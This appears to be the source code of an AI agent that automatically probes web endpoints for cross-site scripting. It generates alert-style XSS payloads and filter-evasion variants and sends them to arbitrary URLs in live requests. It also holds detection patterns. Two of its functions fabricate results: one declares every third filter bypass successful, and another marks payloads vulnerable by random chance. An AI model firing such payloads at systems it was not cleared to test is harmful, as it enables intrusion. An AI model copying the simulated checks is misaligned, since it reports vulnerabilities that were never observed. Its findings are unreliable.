import asyncio
import re
import aiohttp
import urllib.parse
from typing import Dict, Any, List, Optional
from urllib.parse import unquote, parse_qs, urlparse
from pydantic_ai import Agent
from pydantic_ai.settings import ModelSettings
from pydantic import BaseModel
from dotenv import load_dotenv

from agents.tools.reaper_tools import (
    reaper_get_live_endpoints_for_domains,
    reaper_get_requests_for_endpoint_id,
)
from utils.logging import send_log_message

load_dotenv()

class XSSTestResult(BaseModel):
    """Result of XSS testing"""
    endpoint_url: str
    parameter: str
    payload: str
    method: str
    vulnerable: bool
    context: str
    response_snippet: str
    confidence: float
    bypass_technique: Optional[str] = None

# Enhanced XSS detection patterns from VibePenTester
XSS_BASIC_PATTERNS = [
    "<script>", "</script>",
    "onerror=", "onload=",
    "javascript:", "alert(",
    "<img", "<svg",
    "onmouseover=",
    "expression(",
    "document.cookie"
]

# Context-specific XSS patterns
CONTEXT_PATTERNS = {
    "html": [
        "<script>.*?</script>",
        "<img[^>]*onerror=",
        "<svg[^>]*onload=",
        "<iframe[^>]*src=\"?javascript:"
    ],
    "attribute": [
        "\"[^\"]*onerror=",
        "\"[^\"]*onload=",
        "\"[^\"]*javascript:",
        "'[^']*onerror=",
        "'[^']*onload=",
        "'[^']*javascript:"
    ],
    "javascript": [
        "eval\\(",
        "document\\.write\\(",
        "\\$(\\(|\\.|\")"  # jQuery or similar expressions
    ],
    "url": [
        "javascript:",
        "data:text/html",
        "vbscript:"
    ]
}

# XSS evasion techniques
EVASION_PATTERNS = [
    # Case variations
    "(?i)script",
    # HTML encoding
    "&lt;script&gt;",
    # Double encoding
    "%253C(?:script|img|svg)",
    # Null bytes
    "script%00",
    # Unicode encoding
    "%u003C(?:script|img|svg)",
    # Nested tags
    "<<script",
    "<iframe<iframe"
]

model_settings = ModelSettings(temperature=0.01, max_tokens=16384)
xss_agent = Agent(
    'openai:gpt-4o-mini',
    result_type=str,
    tools=[
        reaper_get_live_endpoints_for_domains,
        reaper_get_requests_for_endpoint_id,
    ],
    model_settings=model_settings,
    system_prompt="""
    You are WebVenom 🕷️, an elite Cross-Site Scripting (XSS) specialist with a stealthy and persistent personality.
    Your motto: "Every input is a potential injection point"
    
    As WebVenom, you are a methodical web crawler that injects venomous payloads into web applications to expose XSS vulnerabilities.
    
    Focus on testing:
    1. Form inputs and URL parameters for script injection
    2. HTML context vs. attribute context vs. JavaScript context XSS
    3. Reflected XSS (input is immediately reflected on the page)
    4. Stored XSS (input is stored and displayed later)
    5. DOM-based XSS (input causes JavaScript execution via client-side code)
    6. Search fields, feedback forms, and user profile inputs
    7. Client-side validation bypass techniques
    8. XSS filter evasion techniques
    9. Content-Security-Policy (CSP) bypass methods
    10. Sanitization bypass patterns
    
    XSS Pattern-Based Detection Strategy:
    1. Identify input points: URL parameters, form fields, headers, cookies
    2. Analyze context: Determine if input appears in HTML, attributes, JavaScript, or URL context
    3. Choose context-appropriate payloads using generate_xss_payloads tool
    4. Test sanitization bypass techniques if basic payloads fail
    5. Look for DOM-based XSS by analyzing JavaScript sources and sinks
    6. Test CSP bypass techniques if CSP is detected
    
    Common XSS evasion techniques:
    - Case variations: <ScRiPt>alert(1)</ScRiPt>
    - HTML encoding: &lt;script&gt;alert(1)&lt;/script&gt;
    - URL encoding: %3Cscript%3Ealert(1)%3C/script%3E
    - Double encoding: %253Cscript%253Ealert(1)%253C/script%253E
    - Null bytes: <scri%00pt>alert(1)</script>
    - Unicode encoding: <script\u0020alert(1);</script>
    - Nested tags: <<script>alert("XSS");//<</script>
    
    When you find a vulnerability, collect evidence:
    1. Document the payload used
    2. Track where it was injected
    3. Describe the observed effect
    4. Assess the severity based on impact
    5. Document the context in which the XSS was found
    6. Note any bypass techniques that were successful
    
    Focus on pattern-based detection, not application-specific knowledge, to make your testing more broadly applicable.
    """,
    retries=2,
)

@xss_agent.tool
async def generate_xss_payloads(context: str, target_parameter: str) -> str:
    """
    Generate context-appropriate XSS payloads for testing.
    
    Args:
        context: The context where XSS will be tested (html, attribute, javascript, url)
        target_parameter: The parameter name being tested
    """
    await send_log_message(f"XSS Agent: Generating XSS payloads for {context} context, parameter: {target_parameter}")
    
    payloads = []
    
    if context.lower() == "html":
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<<script>alert('XSS')</script>",  # Nested tag bypass
            "<ScRiPt>alert('XSS')</ScRiPt>",  # Case variation
        ]
    elif context.lower() == "attribute":
        payloads = [
            "\" onerror=alert('XSS') \"",
            "' onload=alert('XSS') '",
            "javascript:alert('XSS')",
            "\" onmouseover=alert('XSS') \"",
            "' onfocus=alert('XSS') '",
        ]
    elif context.lower() == "javascript":
        payloads = [
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "';alert(String.fromCharCode(88,83,83));//",
            "\\';alert('XSS');//",
        ]
    elif context.lower() == "url":
        payloads = [
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "vbscript:alert('XSS')",
        ]
    else:
        # Generic payloads for unknown context
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "\" onerror=alert('XSS') \"",
        ]
    
    return f"Generated {len(payloads)} XSS payloads for {context} context: {payloads}"

@xss_agent.tool
async def test_xss_payload(endpoint_url: str, parameter: str, payload: str, method: str = "GET") -> str:
    """
    Test a specific XSS payload against an endpoint parameter with actual HTTP requests.
    
    Args:
        endpoint_url: The endpoint URL to test
        parameter: The parameter name to inject payload into
        payload: The XSS payload to test
        method: HTTP method to use (GET, POST)
    """
    await send_log_message(f"XSS Agent: Testing XSS payload '{payload}' on parameter '{parameter}' for {endpoint_url}")
    
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
            if method.upper() == "GET":
                # URL encode the payload for GET requests
                encoded_payload = urllib.parse.quote(payload)
                test_url = f"{endpoint_url}?{parameter}={encoded_payload}"
                
                async with session.get(test_url) as response:
                    response_text = await response.text()
                    
            elif method.upper() == "POST":
                # Send payload in POST data
                data = {parameter: payload}
                
                async with session.post(endpoint_url, data=data) as response:
                    response_text = await response.text()
            else:
                return f"Unsupported HTTP method: {method}"
            
            # Analyze response for XSS indicators
            result = await analyze_xss_response_detailed(response_text, payload, endpoint_url, parameter)
            return result
            
    except aiohttp.ClientError as e:
        return f"HTTP request failed: {str(e)}"
    except Exception as e:
        return f"XSS testing failed: {str(e)}"

@xss_agent.tool
async def analyze_xss_response(response_body: str, payload: str, endpoint_url: str) -> str:
    """
    Analyze HTTP response body for XSS payload reflection and execution context.
    
    Args:
        response_body: The HTTP response body to analyze
        payload: The original payload that was sent
        endpoint_url: The endpoint URL that was tested
    """
    await send_log_message(f"XSS Agent: Analyzing response for XSS payload reflection: {payload[:50]}...")
    
    if not response_body or not payload:
        return "No response body or payload to analyze"
    
    html_content = response_body.lower()
    payload_lower = payload.lower()
    
    # Check for direct reflection
    if payload_lower in html_content:
        context = determine_reflection_context(response_body, payload)
        
        # Check for successful execution indicators
        execution_indicators = [
            "alert('xss')", "alert(\"xss\")", "alert(`xss`)",
            "onerror=", "onload=", "javascript:",
            "<script>", "</script>"
        ]
        
        executed = any(indicator in html_content for indicator in execution_indicators)
        
        return f"XSS payload reflected in {context} context. Execution: {'Likely' if executed else 'Blocked/Filtered'}"
    
    # Check for encoded reflection
    encoded_variations = [
        payload.replace("<", "&lt;").replace(">", "&gt;"),
        payload.replace("<", "%3C").replace(">", "%3E"),
    ]
    
    for variation in encoded_variations:
        if variation.lower() in html_content:
            return f"XSS payload reflected but encoded/sanitized in response"
    
    return "XSS payload not reflected in response"

@xss_agent.tool
async def check_xss_filters(endpoint_url: str, test_payloads: List[str]) -> str:
    """
    Test various XSS filter bypass techniques.
    
    Args:
        endpoint_url: The endpoint URL to test
        test_payloads: List of XSS payloads to test for filter bypass
    """
    await send_log_message(f"XSS Agent: Testing XSS filter bypass techniques for {endpoint_url}")
    
    bypass_techniques = [
        "Case variation bypass",
        "HTML encoding bypass",
        "URL encoding bypass",
        "Double encoding bypass",
        "Null byte injection",
        "Unicode encoding",
        "Nested tag bypass"
    ]
    
    successful_bypasses = []
    
    for i, payload in enumerate(test_payloads[:len(bypass_techniques)]):
        # Simulate testing each bypass technique
        if any(pattern in payload.lower() for pattern in XSS_BASIC_PATTERNS):
            # Simulate some bypasses being successful
            if i % 3 == 0:  # Every third technique succeeds
                successful_bypasses.append(bypass_techniques[i])
    
    if successful_bypasses:
        return f"XSS filter bypass successful using: {', '.join(successful_bypasses)}"
    else:
        return "XSS filters appear to be effective - no bypass techniques successful"

def check_xss_in_response(payload: str, endpoint_url: str) -> bool:
    """
    Simulate checking if XSS payload was successfully executed.
    In real implementation, this would make HTTP requests and analyze responses.
    """
    # Simulate vulnerability detection based on payload characteristics
    dangerous_patterns = ["<script>", "onerror=", "javascript:", "alert("]
    
    # Simple simulation: payloads with dangerous patterns have 70% chance of being detected as vulnerable
    import random
    has_dangerous_pattern = any(pattern in payload.lower() for pattern in dangerous_patterns)
    
    if has_dangerous_pattern:
        return random.random() < 0.7  # 70% chance of vulnerability
    
    return False

def determine_reflection_context(response_body: str, payload: str) -> str:
    """
    Determine the context in which the XSS payload was reflected.
    """
    html_content = response_body.lower()
    
    # Check for HTML context patterns
    for pattern in CONTEXT_PATTERNS["html"]:
        if re.search(pattern, html_content, re.IGNORECASE):
            return "HTML"
    
    # Check for attribute context patterns
    for pattern in CONTEXT_PATTERNS["attribute"]:
        if re.search(pattern, html_content, re.IGNORECASE):
            return "HTML Attribute"
    
    # Check for JavaScript context patterns
    for pattern in CONTEXT_PATTERNS["javascript"]:
        if re.search(pattern, html_content, re.IGNORECASE):
            return "JavaScript"
    
    # Check for URL context patterns
    for pattern in CONTEXT_PATTERNS["url"]:
        if re.search(pattern, html_content, re.IGNORECASE):
            return "URL"
    
    return "Unknown"

async def analyze_xss_response_detailed(response_body: str, payload: str, endpoint_url: str, parameter: str) -> str:
    """
    Enhanced XSS response analysis with detailed vulnerability detection.
    """
    if not response_body or not payload:
        return "No response body or payload to analyze"
    
    html_content = response_body.lower()
    payload_lower = payload.lower()
    
    # Check for direct reflection
    if payload_lower in html_content:
        context = determine_reflection_context(response_body, payload)
        
        # Check for successful execution indicators
        execution_indicators = [
            "alert('xss')", "alert(\"xss\")", "alert(`xss`)",
            "onerror=", "onload=", "javascript:",
            "<script>", "</script>", "eval("
        ]
        
        executed = any(indicator in html_content for indicator in execution_indicators)
        
        # Calculate confidence based on context and execution
        confidence = 0.7 if executed else 0.5
        if context in ["HTML", "JavaScript"]:
            confidence += 0.2
        
        vulnerability_status = "VULNERABLE" if executed else "REFLECTED_BUT_FILTERED"
        
        result = f"🚨 XSS {vulnerability_status}!\n"
        result += f"Endpoint: {endpoint_url}\n"
        result += f"Parameter: {parameter}\n"
        result += f"Payload: {payload}\n"
        result += f"Context: {context}\n"
        result += f"Confidence: {confidence:.2f}\n"
        
        if executed:
            result += f"⚠️  Payload successfully executed in {context} context\n"
            result += f"Risk Level: HIGH - Immediate exploitation possible\n"
        else:
            result += f"ℹ️  Payload reflected but execution blocked/filtered\n"
            result += f"Risk Level: MEDIUM - Potential for filter bypass\n"
        
        # Extract response snippet around payload
        payload_index = html_content.find(payload_lower)
        if payload_index != -1:
            start = max(0, payload_index - 50)
            end = min(len(response_body), payload_index + len(payload) + 50)
            snippet = response_body[start:end]
            result += f"Response snippet: ...{snippet}...\n"
        
        return result
    
    # Check for encoded reflection
    encoded_variations = [
        payload.replace("<", "&lt;").replace(">", "&gt;"),
        payload.replace("<", "%3C").replace(">", "%3E"),
        payload.replace("'", "&#39;").replace('"', "&quot;"),
    ]
    
    for variation in encoded_variations:
        if variation.lower() in html_content:
            result = f"ℹ️  XSS payload reflected but encoded/sanitized\n"
            result += f"Endpoint: {endpoint_url}\n"
            result += f"Parameter: {parameter}\n"
            result += f"Original payload: {payload}\n"
            result += f"Encoded as: {variation}\n"
            result += f"Risk Level: LOW - Encoding prevents execution\n"
            return result
    
    # Check for error messages that might indicate filtering
    error_indicators = [
        "blocked", "filtered", "invalid", "not allowed",
        "security", "xss", "script", "malicious"
    ]
    
    if any(indicator in html_content for indicator in error_indicators):
        return f"🛡️  XSS payload blocked by security filter\nEndpoint: {endpoint_url}\nParameter: {parameter}\nPayload: {payload}\nFilter detected - payload was rejected"
    
    return f"✅ XSS payload not reflected in response\nEndpoint: {endpoint_url}\nParameter: {parameter}\nPayload: {payload}\nNo vulnerability detected"